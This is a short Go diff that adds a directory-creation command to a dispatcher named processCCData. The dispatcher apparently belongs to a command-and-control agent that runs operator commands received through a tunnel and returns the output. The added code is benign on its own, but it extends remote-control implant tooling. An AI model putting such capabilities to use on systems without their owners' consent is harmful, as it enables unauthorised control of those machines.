@@ -106,6 +106,21 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// mkdir
+		if cmdSlice[0] == "mkdir" {
+			if len(cmdSlice) < 2 {
+				return
+			}
+
+			path := strings.Join(cmdSlice[1:], " ")
+			out = "Mkdir " + path
+			if err = os.MkdirAll(path, 0700); err != nil {
+				out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// copy file/dir
 		if cmdSlice[0] == "cp" {
 			if len(cmdSlice) < 3 {
